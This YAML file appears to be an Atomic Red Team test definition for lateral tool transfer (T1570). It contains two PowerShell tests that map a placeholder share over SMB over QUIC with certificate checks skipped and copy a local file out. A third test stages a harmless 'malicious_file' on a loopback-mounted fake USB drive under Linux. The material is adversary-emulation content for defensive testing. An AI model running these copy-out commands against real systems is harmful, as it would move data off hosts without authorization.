attack_technique: T1570
display_name: 'Lateral Tool Transfer'
atomic_tests:
- name: Exfiltration Over SMB over QUIC (New-SmbMapping)
  auto_generated_guid: d8d13303-159e-4f33-89f4-9f07812d016f
  description: |
    Simulates an attacker exfiltrating data over SMB over QUIC using the New-SmbMapping command.
    Prerequisites:
      - A file server running Windows Server 2022 Datacenter: Azure Edition
      - A Windows 11 computer
      - Windows Admin Center
  supported_platforms:
    - windows
  input_arguments:
    remote_path:
      description: The UNC path to the share on the file server
      type: string
      default: '\\example.com\sales'
    local_file:
      description: The local file to be transferred
      type: path
      default: 'C:\path\to\file.txt'
  executor:
    command: |
      New-SmbMapping -RemotePath '#{remote_path}' -TransportType QUIC -SkipCertificateCheck
      copy '#{local_file}' 'Z:\'
    name: powershell
    elevation_required: true
- name: Exfiltration Over SMB over QUIC (NET USE)
  auto_generated_guid: 183235ca-8e6c-422c-88c2-3aa28c4825d9
  description: |
    Simulates an attacker exfiltrating data over SMB over QUIC using the NET USE command.
    Prerequisites:
      - A file server running Windows Server 2022 Datacenter: Azure Edition
      - A Windows 11 computer
      - Windows Admin Center
  supported_platforms:
    - windows
  input_arguments:
    remote_path:
      description: The UNC path to the share on the file server
      type: string
      default: '\\example.com\sales'
    local_file:
      description: The local file to be transferred
      type: path
      default: 'C:\path\to\file.txt'
  executor:
    command: |
      NET USE * '#{remote_path}' /TRANSPORT:QUIC /SKIPCERTCHECK
      copy '#{local_file}' '*:\'
    name: powershell
    elevation_required: true

- name: Linux - Transfer Tool from external drive
  auto_generated_guid: 77dc31fe-1114-4cde-8022-df3e76ac00ec
  description: |
    Simulates the transfer of a malicious tool or file from a loopback device mounted as an external device to the system.
  supported_platforms:
  - linux
  dependencies:
  - description: |
      Requires sudo privileges to create and delete a loopback device.
    prereq_command: |
      [ -d /mnt/badusb ] 
    get_prereq_command: |
      sudo mkdir -p /mnt/badusb
      # Create a loopback device simulating an external USB
      dd if=/dev/zero of=/tmp/badusb.img bs=1M count=10
      sudo losetup -fP /tmp/badusb.img
      LOOP_DEV=$(sudo losetup | grep badusb.img | awk '{print $1}')
      sudo mkfs.ext4 $LOOP_DEV
      
  dependency_executor_name: sh
  executor:
    name: sh
    elevation_required: true
    command: |

      LOOP_DEV=$(sudo losetup | grep badusb.img | awk '{print $1}')
      # Mount to temporarily place malicious file
      sudo mount $LOOP_DEV /mnt/badusb
      # Preload the malicious file onto the simulated external drive
      sudo sh -c 'echo "Malicious content" > /mnt/badusb/malicious_file'
      sudo umount /mnt/badusb
      
      # Remount for test
      sudo mount $LOOP_DEV /mnt/badusb
      # Simulate transferring the preloaded malicious tool or file
      sudo cp /mnt/badusb/malicious_file /tmp/malicious_file

      sudo cat /tmp/malicious_file
  cleanup_command: |
      # Clean up
      sudo umount /mnt/badusb
      sudo losetup -d $(sudo losetup | grep badusb.img | awk '{print $1}')
      sudo rm -rf /tmp/malicious_file /tmp/badusb.img /mnt/badusb
